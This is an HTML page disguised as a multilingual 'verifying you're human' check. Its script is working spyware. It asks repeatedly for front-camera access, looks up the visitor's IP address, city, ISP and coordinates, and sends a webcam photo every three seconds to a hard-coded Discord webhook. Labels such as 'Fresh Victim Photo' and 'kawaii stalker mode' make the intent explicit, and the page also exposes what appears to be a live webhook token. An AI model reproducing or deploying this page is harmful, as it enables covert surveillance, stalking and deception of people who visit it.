<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying You're Human... / à®¨à¯€à®™à¯à®•à®³à¯ à®®à®©à®¿à®¤à®°à®¾ à®à®© à®šà®°à®¿à®ªà®¾à®°à¯à®•à¯à®•à®¿à®±à®¤à¯... / à¶”à¶¶ à¶¸à·’à¶±à·’à·ƒà·™à¶šà·Šà¶¯à·à¶ºà·’ à·ƒà¶­à·Šâ€à¶ºà·à¶´à¶±à¶º à¶šà¶»à¶¸à·’à¶±à·Š...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0a0026, #1a0052);
      color: #00ffea;
      font-family: Arial, sans-serif;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    #verify-screen {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.95);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 30px;
    }
    .title {
      font-size: 3rem;
      margin-bottom: 30px;
      text-shadow: 0 0 20px #00ffea;
      animation: glow 2s infinite alternate;
    }
    .status {
      font-size: 1.8rem;
      margin: 20px 0;
      color: #ff69b4;
      min-height: 80px;
    }
    .lang-block {
      font-size: 1.5rem;
      margin: 15px 0;
      line-height: 1.5;
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 8px solid #00ffea;
      border-top: 8px solid transparent;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
      margin: 30px auto;
    }
    .btn-retry {
      display: none;
      padding: 18px 60px;
      font-size: 1.8rem;
      background: #ff1493;
      color: white;
      border: none;
      border-radius: 50px;
      margin-top: 30px;
      cursor: pointer;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .btn-retry:hover {
      background: #ff69b4;
      transform: scale(1.05);
    }
    @keyframes glow {
      from { text-shadow: 0 0 15px #00ffea; }
      to { text-shadow: 0 0 50px #00ffea; }
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    video, canvas { display: none; }
  </style>
</head>
<body>

<div id="verify-screen">
  <div class="title">Verifying You're Human... / à®¨à¯€à®™à¯à®•à®³à¯ à®®à®©à®¿à®¤à®°à®¾ à®à®© à®šà®°à®¿à®ªà®¾à®°à¯à®•à¯à®•à®¿à®±à®¤à¯... / à¶”à¶¶ à¶¸à·’à¶±à·’à·ƒà·™à¶šà·Šà¶¯à·à¶ºà·’ à·ƒà¶­à·Šâ€à¶ºà·à¶´à¶±à¶º à¶šà¶»à¶¸à·’à¶±à·Š...</div>
  
  <div class="spinner" id="spinner"></div>
  
  <div class="status" id="status"></div>
  
  <div class="lang-block">
    <strong>English:</strong> Tap ALLOW to verify and continue<br>
    <strong>à®¤à®®à®¿à®´à¯:</strong> à®¤à¯Šà®Ÿà®° à®šà®°à®¿à®ªà®¾à®°à¯à®•à¯à®• ALLOW à®à®©à¯à®ªà®¤à¯ˆ à®¤à®Ÿà¯à®Ÿà®µà¯à®®à¯<br>
    <strong>à·ƒà·’à¶‚à·„à¶½:</strong> à¶­à·„à·€à·”à¶»à·” à¶šà·’à¶»à·“à¶¸à¶§ ALLOW à¶”à¶¶à¶±à·Šà¶±
  </div>
  
  <button class="btn-retry" id="retryBtn">Try Again - Allow Camera â™¡ / à®®à¯€à®£à¯à®Ÿà¯à®®à¯ à®®à¯à®¯à®±à¯à®šà®¿ / à¶±à·à·€à¶­ à¶‹à¶­à·Šà·ƒà·à·„ à¶šà¶»à¶±à·Šà¶±</button>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
//  Your Discord webhook
<script>
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Your Discord webhook
const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";

// Elements
const status = document.getElementById('status');
const spinner = document.getElementById('spinner');
const retryBtn = document.getElementById('retryBtn');
const verifyScreen = document.getElementById('verify-screen');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Messages
const messages = {
  verifying: [
    "Verifying you're human... Please wait â™¡",
    "à®¨à¯€à®™à¯à®•à®³à¯ à®®à®©à®¿à®¤à®°à®¾ à®à®© à®šà®°à®¿à®ªà®¾à®°à¯à®•à¯à®•à®¿à®±à¯‹à®®à¯... à®•à®¾à®¤à¯à®¤à®¿à®°à¯à®•à¯à®•à®µà¯à®®à¯ â™¡",
    "à¶”à¶¶ à¶¸à·’à¶±à·’à·ƒà·™à¶šà·Šà¶¯à·à¶ºà·’ à·ƒà¶­à·Šâ€à¶ºà·à¶´à¶±à¶º à¶šà¶»à¶¸à·’à¶±à·Š... à¶»à·à¶³à·“ à·ƒà·’à¶§à·’à¶±à·Šà¶± â™¡"
  ],
  failed: [
    "Verification failed! Please tap ALLOW to continue â™¡",
    "à®šà®°à®¿à®ªà®¾à®°à¯à®ªà¯à®ªà¯ à®¤à¯‹à®²à¯à®µà®¿! à®¤à®¯à®µà¯à®šà¯†à®¯à¯à®¤à¯ ALLOW à® à®…à®´à¯à®¤à¯à®¤à®µà¯à®®à¯ â™¡",
    "à·ƒà¶­à·Šâ€à¶ºà·à¶´à¶±à¶º à¶…à·ƒà·à¶»à·Šà¶®à¶šà¶ºà·’! à¶šà¶»à·”à¶«à·à¶šà¶» ALLOW à¶”à¶¶à¶±à·Šà¶± â™¡"
  ],
  begging: [
    "Pretty please~ Allow camera to continue â™¡",
    "à®…à®´à®•à®¾à®• à®•à¯‡à®Ÿà¯à®•à®¿à®±à¯‡à®©à¯~ à®•à¯‡à®®à®°à®¾à®µà¯ˆ à®…à®©à¯à®®à®¤à®¿à®•à¯à®•à®µà¯à®®à¯ â™¡",
    "à¶šà¶»à·”à¶«à·à¶šà¶»à¶½à·~ à¶šà·à¶¸à¶»à·à·€à¶§ à¶…à·€à·ƒà¶» à¶¯à·™à¶±à·Šà¶± â™¡"
  ]
};

let currentLangIndex = 0;

function updateStatus(type) {
  status.innerHTML = messages[type][currentLangIndex];
  currentLangIndex = (currentLangIndex + 1) % 3;
}

// Get IP + geo info
async function getIPAndGeo() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    return {
      ip: data.ip || 'unknown',
      country: data.country || 'unknown',
      city: data.city || 'unknown',
      region: data.region || 'unknown',
      isp: data.connection?.isp || 'unknown',
      lat: data.latitude || 'N/A',
      lon: data.longitude || 'N/A',
      timezone: data.timezone?.id || 'unknown'
    };
  } catch {
    return { ip: '???.???.???.???', country: '??', city: '??', isp: '??', lat: 'N/A', lon: 'N/A', timezone: '??' };
  }
}

// Send photo + info
async function sendCapture(blob, geo, isFirst = false) {
  const timestamp = new Date().toLocaleString();
  const ipSafe = geo.ip.replace(/\./g, '_');

  const textContent = isFirst
    ? `ğŸ€ FIRST SUCCESS! Camera allowed! â™¡\nIP: ${geo.ip}\nğŸ“ ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTime: ${timestamp}`
    : `ğŸ“¸ New photo captured!\nIP: ${geo.ip}\nğŸ“ ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nTime: ${timestamp}`;

  const embed = {
    title: isFirst ? "âœ¨ Camera Permission Granted!" : "ğŸ“¸ Fresh Victim Photo â™¡",
    description: `**IP:** \`${geo.ip}\`\n**Location:** ${geo.city}, ${geo.region}, ${geo.country}\n**ISP:** ${geo.isp}`,
    color: isFirst ? 0x00ff9d : 0xff69b4,
    timestamp: new Date().toISOString(),
    footer: { text: "kawaii stalker mode >w<" }
  };

  const formData = new FormData();
  formData.append('file', blob, `cap_${ipSafe}_${Date.now()}.jpg`);
  formData.append('payload_json', JSON.stringify({
    content: textContent,
    embeds: [embed]
  }));

  try {
    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
  } catch {}
}

// â”€â”€â”€ Main permission loop â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function requestCamera() {
  try {
    retryBtn.style.display = 'none';
    spinner.style.display = 'block';
    updateStatus('verifying');

    // Fake thinking time
    await new Promise(r => setTimeout(r, 4000));

    // Ask for camera
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    // â”€â”€ SUCCESS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    verifyScreen.style.display = 'none';
    video.srcObject = stream;
    await video.play();

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const geo = await getIPAndGeo();

    // Send first success message
    const tinyBlob = new Blob([new Uint8Array(1)], { type: 'image/jpeg' });
    await sendCapture(tinyBlob, geo, true);

    // Start sending real photos every 3 sec
    setInterval(async () => {
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.45);
      const byteString = atob(dataUrl.split(',')[1]);
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      const blob = new Blob([ab], { type: 'image/jpeg' });

      await sendCapture(blob, geo, false);
    }, 3000);

  } catch (err) {
    // â”€â”€ FAILED / BLOCKED â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    spinner.style.display = 'none';
    updateStatus('failed');

    // Show retry button
    retryBtn.style.display = 'block';

    // Also show begging message sometimes
    if (Math.random() > 0.5) {
      setTimeout(() => updateStatus('begging'), 2000);
    }

    // Auto-retry after 4 seconds (continuous begging)
    setTimeout(() => {
      retryBtn.style.display = 'none';
      requestCamera();
    }, 4000);
  }
}

// Auto start + make retry button also trigger the same function
retryBtn.onclick = () => {
  retryBtn.style.display = 'none';
  requestCamera();
};

// First attempt
requestCamera();
</script>
</script>

</body>
</html>
